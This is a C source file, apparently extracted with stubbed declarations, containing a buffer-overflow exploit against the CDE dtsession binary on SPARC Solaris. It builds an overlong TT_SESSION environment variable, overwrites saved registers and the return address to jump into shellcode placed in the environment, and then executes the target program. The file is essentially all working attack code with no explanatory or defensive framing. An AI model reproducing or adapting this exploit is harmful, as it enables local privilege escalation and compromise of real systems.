#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  unsigned long u_long ;

/* Variables and functions */
 int BUF_LEN ; 
 int /*<<< orphan*/  SI_PLATFORM ; 
 int /*<<< orphan*/  execve (char*,char**,char**) ; 
 int /*<<< orphan*/  exit (int) ; 
 char* exploit ; 
 char* getenv (char*) ; 
 int /*<<< orphan*/  got ; 
 char* malloc (int) ; 
 int /*<<< orphan*/  memset (char*,char,int) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*) ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 
 char* strdup (char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncpy (char*,char*,int) ; 
 int /*<<< orphan*/  sysinfo (int /*<<< orphan*/ ,char*,int) ; 

main()
{
    char *argp[6], *envp[20];
    char buf[3072];
    char *ttsess;
    char *display;
    u_long *longp;
    char data[512];
    char padding[64];
    char platform[256];
    int pad=31;
    int i;

    memset(buf,0,3072);
    memset(buf,'a',BUF_LEN);

    longp = (unsigned long *)(buf+BUF_LEN);

    /* %l0 - %l7 */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;

    /* %i0 - %i7 */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xefffff94;      /* make sure %i1 can be used */
    *longp++ = 0xdeadcafe;
    *longp++ = got;             /* also used before we get to the exploit */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xefffffb0;      /* frame with some necessary values */
    *longp++ = 0xeffffdd0;      /* return into the exploit code */


    longp=(unsigned long *)data;

    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xffffffff;
    *longp++=0xdeadbeef;
    *longp++=0;
    *longp++=0xefffffb4;
    *longp++=0x01;
    *longp++=0xef6dc154;
    *longp++=0xeffffd26;
    *longp++=0x00;

    argp[0] = strdup("/usr/dt/bin/dtsession");
    argp[1] = NULL;

    if (!getenv("DISPLAY")) {
        printf("forgot to set DISPLAY\n");
        exit(1);
    }

    sysinfo(SI_PLATFORM,platform,256);
    pad+=20-strlen(platform)-strlen(argp[0]);

    for (i=0;i<pad;padding[i++]='C')
        padding[i]=0;

    /* create an enviroment size independent of the size of $DISPLAY */
    display = malloc( 8 + strlen(getenv("DISPLAY")) + 1);
    strcpy(display,"DISPLAY=");
    strcat(display+8,getenv("DISPLAY"));
    envp[0] = display;
    envp[1] = malloc(60);
    memset(envp[1], 0, 60);
    memset(envp[1], 'a', 60 - strlen(envp[0]));
    strncpy(envp[1],"W=",2);

    /* put the exploit code in the env space (easy to locate) */
    envp[2] = strdup(exploit);

    /* create the overflow string */
    ttsess = strdup("TT_SESSION=01 18176 1289637086 1 0 1000 %s 4");
    envp[3] = malloc( strlen(ttsess) + strlen(buf));
    sprintf(envp[3],ttsess,buf);

    /* make it easier to debug, probably smarter ways to do this */
    envp[4] = strdup("LD_BIND_NOW=1   ");

    /* put some data in the environment to keep the code running after the
       overflow, but before the return pointer is used. includes NULL ptrs */
    envp[5]=(data);
    envp[6]="";
    envp[7]="";
    envp[8]="";
    envp[9]=&(data[32]);
    envp[10]="";
    envp[11]="";
    envp[12]=&(data[39]);
    envp[13]="";
    envp[14]="";
    envp[15]="\010";
    envp[16]=padding;
    envp[17]=NULL;

    execve("/usr/dt/bin/dtsession",argp,envp);

}